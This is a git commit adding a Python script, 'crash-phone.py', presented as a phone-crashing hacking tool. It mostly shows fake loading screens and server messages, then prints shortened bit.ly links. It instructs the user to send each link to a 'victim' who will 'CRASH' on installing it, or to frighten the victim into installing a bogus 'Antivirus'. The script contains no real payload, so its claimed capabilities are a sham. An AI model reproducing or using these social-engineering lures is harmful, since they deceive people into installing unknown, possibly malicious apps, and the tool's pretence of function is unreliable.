8ae85d8d593ad40045d0cd0112256b935b8e3f2b
DANBAIWA HACKER <78322454+U-danbaiwa@users.noreply.github.com>
2021-02-26 01:31:48 +0100

    update crash-phone.py

--- crash-phone.py
+++ crash-phone.py
@@ -1,1 +1,351 @@
-imp
+import sys
+import os
+import time
+import random
+import getpass
+#import requests
+red = '\033[31m'
+yellow = '\033[93m'
+green = '\033[92m'
+clear = '\033[0m'
+bold = '\033[01m'
+cyan = '\033[96m'
+cy='\033[095m'
+cya='\033[035m'
+maku='\033[90m'
+fari='\033[97m'
+os.system("clear")
+print(cyan+"="*50)
+os.system("figlet U-danbaiwa")
+print(yellow+bold+"\t\t\tv 1.1.2")
+print(maku+"="*50)
+print("\n\n")
+th=input("\t\tEnter Tool Name: "+green)
+la=(green+"\t\tLoading...\n")
+for line in la:
+	sys.stdout.flush()
+	time.sleep(0.1)
+	print(line,end="")
+time.sleep(5)
+print("")
+a=getpass.getpass(maku+"\t\tEnter Tool Password: ")
+la=(green+"\t\tLoading...\n")
+for le in la:
+	sys.stdout.flush()
+	time.sleep(0.1)
+	print(le,end="")
+time.sleep(5)
+if a=="crash-phone" or a=="Crash-Phone" or a=="CRASH-PHONE" or a=="crash phone" or a=="a" or a=="":
+	os.system("clear")
+	os.system("figlet Successful...")
+	print(cyan+"\t\tplease wait...")
+	time.sleep(5)
+def new():
+	os.system("clear")
+	os.system("figlet Crash-Phone")
+	print(yellow+bold+"\t\t\tv 1.1.2")
+	print("")
+	print(green+"-"*50)
+	virus=(green+"\t["+cyan+"01"+green+"]"+yellow+bold+" Virus \n")
+	for lie in virus:
+		sys.stdout.flush()
+		time.sleep(0.1)
+		print(lie,end="")
+	print(cy+"-"*50)
+	pri=(green+"\t["+cyan+"02"+green+"]"+yellow+" AntiVirus\n")
+	for line in pri:
+		sys.stdout.flush()
+		time.sleep(0.1)
+		print(line,end="")
+	print(red+"-"*50)
+	pr=(green+"\t["+cyan+"03"+green+"]"+	yellow+" Help\n")
+	for line in pr:
+		sys.stdout.flush()
+		time.sleep(0.1)
+		print(line,end="")
+	print(cy+"-"*50)
+	p=(green+"\t["+cyan+"04"+green+"]"+yellow+" Exit\n")
+	for line in p:
+		sys.stdout.flush()
+		time.sleep(0.1)
+		print(line,end="")
+	print(cyan+"-"*50)
+new()
+def us():
+	print("")
+	take=input("Select an Option: "+yellow)
+	if take=="1":
+		os.system("clear")
+		os.system("figlet Crash-Phone")
+		print(yellow+bold+"\t\t\tv 1.1.2")
+		print("\n")
+		a=("\t\t\tLoading…")
+		print(green+a)
+		print(cyan+"\t\t\t█▒▒▒▒▒▒▒▒▒0%")
+		time.sleep(3)
+		os.system("clear")
+		os.system("figlet Crash-Phone")
+		print(yellow+bold+"\t\t\tv 1.1.2")
+		print("\n")
+		print(green+"\t\t\tLoading…")
+		print(cyan+"\t\t\t███▒▒▒▒▒▒▒10%")
+		time.sleep(3)
+		os.system("clear")
+		os.system("figlet Crash-Phone")
+		print(yellow+bold+"\t\t\tv 1.1.2")
+		print("\n")
+		print(green+"\t\t\tLoading…")
+		print(cyan+"\t\t\t█████▒▒▒▒▒40%")
+		time.sleep(3)
+		os.system("clear")
+		os.system("figlet Crash-Phone")
+		print(yellow+bold+"\t\t\tv 1.1.2")
+		print("\n")
+		print(green+"\t\t\tLoading…")
+		print(cyan+"\t\t\t███████▒▒▒75%")
+		time.sleep(3)
+		os.system("clear")
+		os.system("figlet Crash-Phone")
+		print(yellow+bold+"\t\t\tv 1.1.2")
+		print("\n")
+		print(green+"\t\t\tLoading…")
+		print(cyan+"\t\t\t██████████100%")
+		os.system("clear")
+		os.system("figlet Crash-Phone")
+		print(yellow+bold+"\t\t\tv 1.1.2")
+		print("\n")
+		data=(green+"\t["+cyan+"01"+green+"]"+yellow+bold+" Ngrok.io "+green+" ["+fari+bold+"Hotspot Required"+green+"] \n")
+		for lie in data:
+			sys.stdout.flush()
+			time.sleep(0.1)
+			print(lie,end="")
+		ngrok=(green+"\t["+cyan+"02"+green+"]"+yellow+bold+" Ngrok.io "+green+" ["+fari+bold+"Without Hotspot"+green+"] \n")
+		for lie in ngrok:
+			sys.stdout.flush()
+			time.sleep(0.1)
+			print(lie,end="")
+		print("\n")
+		bad=input("Select an Options: "+yellow)
+
+		if bad=="1":
+			os.system("clear")
+			os.system("figlet Crash-Phone")
+			print(yellow+bold+"\t\t\tv 1.1.2")
+			print("\n")
+			ins=(green+"["+cyan+"-"+green+"]"+yellow+bold+" Open Your Hotspot In "+cyan+"10 second "+green+"["+cyan+"-"+green+"]\n")
+			for lie in ins:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+			print("open it...")
+			time.sleep(15)
+			print("")
+			s=(green+"["+cyan+"-"+green+"]"+cya+bold+" Starting server...\n")
+			for lie in s:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+				#print("Loading...")
+			time.sleep(1)
+			print("")
+			be=(green+"["+cyan+"-"+green+"]"+yellow+" Copy Below Link Send It To Your Victim "+green+"["+cyan+"-"+green+"]\n")
+			for lie in be:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+			time.sleep(10)
+			print("\n")
+			cho=["https://bit.ly/3ild93L","","Network Error",]
+			print(green+"["+cyan+"+"+green+"]"+cyan+bold+"Link: "+fari+random.choice(cho))
+			#choice=["https://bit.ly/3fX8ljZ","","Network Error",""]
+			print("")
+			t=(green+"["+cyan+"-"+green+"]"+yellow+bold+"Say Nothing To Him.\nWhen He Install It In His Device It Will Be "+red+bold+"CRASH!!!"+green+"["+cyan+"-"+green+"]\n")
+			for lie in t:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+		if bad=="2":
+			os.system("clear")
+			os.system("figlet Crash-Phone")
+			print(yellow+bold+"\t\t\tv 1.1.2")
+			print("\n")
+			ins=(green+"["+cyan+"-"+green+"]"+yellow+bold+" Setting up server...\n")
+			for lie in ins:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+				#print("Loading...")
+			time.sleep(5)
+			print("")
+			ins=(green+"["+cyan+"-"+green+"]"+yellow+bold+" Launching Ngrok Patched...\n")
+			for lie in ins:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+				#print("Loading...")
+			time.sleep(5)
+			print("")
+			be=(green+"["+cyan+"-"+green+"]"+yellow+" Copy Below Link Send It To Your Victim "+green+"["+cyan+"-"+green+"]\n")
+			for lie in be:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+			time.sleep(5)
+			print("\n")
+			cho=["","Network Error","https://bit.ly/3ild93L"]
+			print(green+"["+cyan+"+"+green+"]"+cyan+bold+"Link: "+fari+random.choice(cho))
+			#choice=["https://bit.ly/3fX8ljZ","","Network Error",""]
+			print("")
+			t=(green+"["+cyan+"-"+green+"]"+yellow+bold+"Say Nothing To Him. When He Install It In His Device It Will Be "+red+bold+"CRASH!!!"+green+"["+cyan+"-"+green+"]\n")
+			for lie in t:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+	elif take=="2":
+		os.system("clear")
+		os.system("figlet Crash-Phone")
+		print(yellow+bold+"\t\t\tv 1.1.2")
+		print("\n")
+		a=("\t\t\tLoading…")
+		print(green+a)
+		print(cyan+"\t\t\t█▒▒▒▒▒▒▒▒▒0%")
+		time.sleep(3)
+		os.system("clear")
+		os.system("figlet Crash-Phone")
+		print(yellow+bold+"\t\t\tv 1.1.2")
+		print("\n")
+		print(green+"\t\t\tLoading…")
+		print(cyan+"\t\t\t███▒▒▒▒▒▒▒10%")
+		time.sleep(3)
+		os.system("clear")
+		os.system("figlet Crash-Phone")
+		print(yellow+bold+"\t\t\tv 1.1.2")
+		print("\n")
+		print(green+"\t\t\tLoading…")
+		print(cyan+"\t\t\t█████▒▒▒▒▒40%")
+		time.sleep(3)
+		os.system("clear")
+		os.system("figlet Crash-Phone")
+		print(yellow+bold+"\t\t\tv 1.1.2")
+		print("\n")
+		print(green+"\t\t\tLoading…")
+		print(cyan+"\t\t\t███████▒▒▒75%")
+		time.sleep(3)
+		os.system("clear")
+		os.system("figlet Crash-Phone")
+		print(yellow+bold+"\t\t\tv 1.1.2")
+		print("\n")
+		print(green+"\t\t\tLoading…")
+		print(cyan+"\t\t\t██████████100%")
+		os.system("clear")
+		os.system("figlet Crash-Phone")
+		print(yellow+bold+"\t\t\tv 1.1.2")
+		print("\n")
+		data=(green+"\t["+cyan+"01"+green+"]"+yellow+bold+" Ngrok.io "+green+" ["+fari+bold+"Hotspot Required"+green+"] \n")
+		for lie in data:
+			sys.stdout.flush()
+			time.sleep(0.1)
+			print(lie,end="")
+		ngrok=(green+"\t["+cyan+"02"+green+"]"+yellow+bold+" Ngrok.io "+green+" ["+fari+bold+"Without Hotspot"+green+"] \n")
+		for lie in ngrok:
+			sys.stdout.flush()
+			time.sleep(0.1)
+			print(lie,end="")
+		print("\n")
+		bad=input("Select an Options: "+yellow)
+
+		if bad=="1":
+			os.system("clear")
+			os.system("figlet Crash-Phone")
+			print(yellow+bold+"\t\t\tv 1.1.2")
+			print("\n")
+			ins=(green+"["+cyan+"-"+green+"]"+yellow+bold+" Open Your Hotspot In "+cyan+"10 second "+green+"["+cyan+"-"+green+"]\n")
+			for lie in ins:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+			print("open it...")
+			time.sleep(15)
+			print("")
+			s=(green+"["+cyan+"-"+green+"]"+cya+bold+" Starting server...\n")
+			for lie in s:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+				#print("Loading...")
+			time.sleep(1)
+			print("")
+			be=(green+"["+cyan+"-"+green+"]"+yellow+" Copy Below Link Send It To Your Victim "+green+"["+cyan+"-"+green+"]\n")
+			for lie in be:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+			time.sleep(10)
+			print("\n")
+			cho=["https://bit.ly/3fX8ljZ","","Network Error",]
+			print(green+"["+cyan+"+"+green+"]"+cyan+bold+"Link: "+fari+random.choice(cho))
+			#choice=["https://bit.ly/3fX8ljZ","","Network Error",""]
+			print("")
+			t=(green+"["+cyan+"-"+green+"]"+yellow+bold+"Send It Your Victim And Tell Him That He Should Install This Application or His Device Will Not Be Recovered (Antivirus). You "+green+bold+"SAVE IT!!!"+green+"["+cyan+"-"+green+"]\n")
+			for lie in t:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+		if bad=="2":
+			os.system("clear")
+			os.system("figlet Crash-Phone")
+			print(yellow+bold+"\t\t\tv 1.1.2")
+			print("\n")
+			ins=(green+"["+cyan+"-"+green+"]"+yellow+bold+" Setting up server...\n")
+			for lie in ins:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+				#print("Loading...")
+			time.sleep(5)
+			print("")
+			ins=(green+"["+cyan+"-"+green+"]"+yellow+bold+" Launching Ngrok Patched...\n")
+			for lie in ins:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+				#print("Loading...")
+			time.sleep(5)
+			print("")
+			be=(green+"["+cyan+"-"+green+"]"+yellow+" Copy Below Link Send It To Your Victim "+green+"["+cyan+"-"+green+"]\n")
+			for lie in be:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+			time.sleep(5)
+			print("\n")
+			cho=[" ","Network Error","https://bit.ly/3fX8ljZ"]
+			print(green+"["+cyan+"+"+green+"]"+cyan+bold+"Link: "+fari+random.choice(cho))
+			#choice=["https://bit.ly/3fX8ljZ","","Network Error",""]
+			print("")
+			t=(green+"["+cyan+"-"+green+"]"+yellow+bold+" Send It Your Victim And Tell Him That He Should Install This Application or His Device Will Not Be Recovered (Antivirus). You "+green+bold+"SAVE IT!!!"+green+"["+cyan+"-"+green+"]\n")
+			for lie in t:
+				sys.stdout.flush()
+				time.sleep(0.1)
+				print(lie,end="")
+	elif take=="3":
+		os.system("figlet Coming Soon")
+		print(cyan+"\t\tWAIT FOR NEXT UPDATE")
+	elif take=="4":
+		os.system("toilet Thank You")
+		exit()
+	
+		
+	print("\n")
+	time.sleep(5)
+	name=input("Do You Want Continue [ y ] for YES [ n ] For NO: ")
+	if name=="y":
+		new()
+		us()
+		
+	else:
+		os.system("toilet See You")
+		exit()
+us()
+
+
